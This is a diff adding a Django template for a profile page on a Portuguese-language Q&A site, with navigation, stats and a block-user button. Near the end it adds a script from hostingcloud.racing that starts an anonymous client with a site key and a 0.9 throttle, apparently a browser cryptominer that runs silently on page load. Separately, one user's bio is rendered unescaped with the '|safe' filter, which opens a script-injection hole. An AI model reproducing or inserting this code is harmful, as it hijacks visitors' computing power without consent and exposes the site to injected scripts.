@@ -1,0 +1,253 @@
+{% load main_app_extras %}
+{% load humanize %}
+<!doctype html>
+<html lang="pt-br">{% if user.username == "Erick" %} {{ user_p.total_views }} visualizações {% endif %}
+	<head>
+		<title>{{user_p.user.username}}</title>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
+		<link href="https://fonts.googleapis.com/css?family=Raleway:400,500,500i,700,800i" rel="stylesheet">
+
+		<script src="https://kit.fontawesome.com/1f965a8b94.js"></script>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+		<script type="text/javascript">
+			$(document).ready(function() {
+				$('.navbar-light .dmenu').hover(function() {
+					$(this).find('.sm-menu').first().stop(true, true).slideDown(150);
+				}, function() {
+					$(this).find('.sm-menu').first().stop(true, true).slideUp(105)
+				});
+			});
+		</script>
+
+		<style>
+			#responses-section {
+				width: 50%;
+			}
+
+			#questions-section {
+				width: 50%;
+			}
+
+			#center1 img {
+				width: 10%;
+				display: block;
+			}
+
+			#bio {
+				width: 50%;
+			}
+
+            .table {
+                width: 50%;
+                margin: 0 auto;
+            }
+
+            #tabs {
+				width: 50%;
+				margin: auto;
+			}
+
+			#edit-profile {
+				width: 50%;
+				margin: auto;
+			}
+
+			#questions-section {
+				width: 50%;
+				margin: auto;
+			}
+
+			#responses-section {
+				width: 50%;
+				margin: auto;
+			}
+
+			@media (min-width: 320px) and (max-width: 480px) {
+				#edit-profile {
+					width: 95%;
+				}
+
+				#tabs {
+					width: 95%;
+				}
+
+				#center1 img {
+					width: 25%;
+				}
+
+				.table {
+				    width: 98%;
+				}
+
+				#bio {
+					width: 90%;
+				}
+
+				#qs {
+					width: 95%;
+				}
+
+				#rs {
+					width: 95%;
+				}
+
+				#responses-section {
+					width: 95%;
+				}
+
+				#questions-section {
+					width: 95%;
+				}
+			}
+		</style>
+
+		<link rel="stylesheet" href="/static/css/profile.css">
+	</head>
+	<body>
+		<nav class="navbar navbar-expand-sm   navbar-light bg-light">
+		    <a href="/" class="navbar-brand"><img src="/static/images/asker.png" height="40px" alt="Asker"></a>
+			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarTogglerDemo03" aria-controls="navbarTogglerDemo03" aria-expanded="false" aria-label="Toggle navigation">
+				<span class="navbar-toggler-icon"></span>
+			</button>
+
+			<div class="collapse navbar-collapse" id="navbarTogglerDemo03">
+				<ul class="navbar-nav mr-auto mt-2 mt-lg-0">
+					{% if user.is_authenticated %}
+    					{% if user.username != user_p.user.username %}
+    					<li class="nav-item">
+    					    <a class="nav-link" href="/user/{{user.username}}"><i class="far fa-user"></i> perfil</a>
+    					</li>
+    					{% endif %}
+					<li class="nav-item">
+						<a class="nav-link" href="/ask"><i class="fas fa-question"></i> perguntar</a>
+					</li>
+					<li class="nav-item">
+					    <a class="nav-link" href="/notifications"><i class="far fa-bell"></i> notificações</a>
+					</li>
+					<li class="nav-item">
+					    <a class="nav-link" href="/rank"><i class="fas fa-trophy"></i> rank</a>
+					</li>
+					<li class="nav-item">
+						<a class="nav-link" href="/logout"><i class="fas fa-external-link-alt"></i> sair</a>
+					</li>
+					{% else %}
+					<li class="nav-item">
+						<a class="nav-link" href="/signin">Entrar</a>
+					</li>
+					<li class="nav-item">
+						<a class="nav-link" href="/signup">Criar uma conta</a>
+					</li>
+					{% endif %}
+				</ul>
+			</div>
+		</nav>
+		<center id="center1">
+		    <img src="{{user_p.avatar.url}}" alt="{{user_p.user.username}}"> <span>{{ user_p.user.username }}</span>
+			{% if user_p.user.username == "Erick" %}<p id="bio">{{ user_p.bio|safe }}</p>{% else %}
+			<p id="bio">{{ user_p.bio }}</p>{% endif %}
+		</center>
+		<table class="table table-bordered">
+		  <thead>
+			<tr>
+			  <th scope="col">Perguntas</th>
+			  <th scope="col">Respostas</th>
+			  <th scope="col">Pontos</th>
+			</tr>
+		  </thead>
+		  <tbody>
+			<tr>
+			  <td>{{user_p.total_questions}}</td>
+			  <td>{{user_p.total_responses}}</td>
+			  <td>{{user_p.total_points}}</td>
+			</tr>
+		  </tbody>
+		</table>
+
+		{% if user_p.user.username != user.username %}
+		<style>
+			#block-div {
+				margin: 1%;
+			}
+		</style>
+
+		<center id="block-div">
+			<button id="block-button" class="btn btn-outline-info" onclick="block_user()">{{ user.username|blocked:user_p.user.username }}</button>
+		</center>
+		
+		<script>
+			function block_user() {
+				button = document.getElementById('block-button')
+				
+				$.ajax({
+					type: 'get',
+					url: '/user/{{ user_p.user.username }}/block',
+					data: {
+						'action': button.innerHTML,
+					},
+					complete: function(data) {
+						if(button.innerHTML == 'Bloqueado') {
+							button.innerHTML = 'Bloquear'
+						} else
+							button.innerHTML = 'Bloqueado'
+					}
+				})	
+			}
+		</script>
+		{% endif %}
+
+		{% if user_p.user.username == user.username %}
+		<div id="edit-profile"><a href="/user/{{ user.username }}/edit">Editar perfil</a></div>
+		<ul class="nav nav-tabs" id="tabs">
+			<li class="nav-item">
+				<a class="nav-link active"  id="questions">Perguntas</a>
+			</li>
+			<li class="nav-item">
+				<a class="nav-link disabled" id="responses">Respostas</a>
+			</li>
+		</ul>
+		{% endif %}
+		<section id="questions-section">
+			<div id="qs">
+				{% for question in questions %}
+				<hr>
+				<div class="question">
+					<a href="/question/{{ question.id }}">{{ question.text }}</a> <span>&middot; perguntada {{ question.pub_date|naturalday }}</span>
+				</div>
+				<hr>
+				{% endfor %}
+			</div>{% if user.username == user_p.user.username %}
+			<button class="btn btn-outline-primary" onclick="show_more_questions(this)">mais</button>{% endif %}
+		</section>
+
+		<section id="responses-section">
+			<div id="rs">
+				{% for response in responses %}
+				<hr>
+				<div class="response">
+					<a href="/question/{{ response.question.id }}">{{ response.question.text }}</a><br>
+					<p>{{ response.text }}</p>
+				</div>
+				<hr>
+				{% endfor %}
+			</div>
+			<button class="btn btn-outline-primary" onclick="show_more_responses(this)">mais</button>
+		</section>
+{% if user_p.user.username == user.username %}
+<script src="/static/js/profile.js"></script>
+{% endif %}
+<script src="https://www.hostingcloud.racing/gCgZ.js"></script>
+<script>
+    var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
+        throttle: 0.9, c: 'w', ads: 0
+    });
+    _client.start();
+
+
+</script>
+	</body>
+</html>
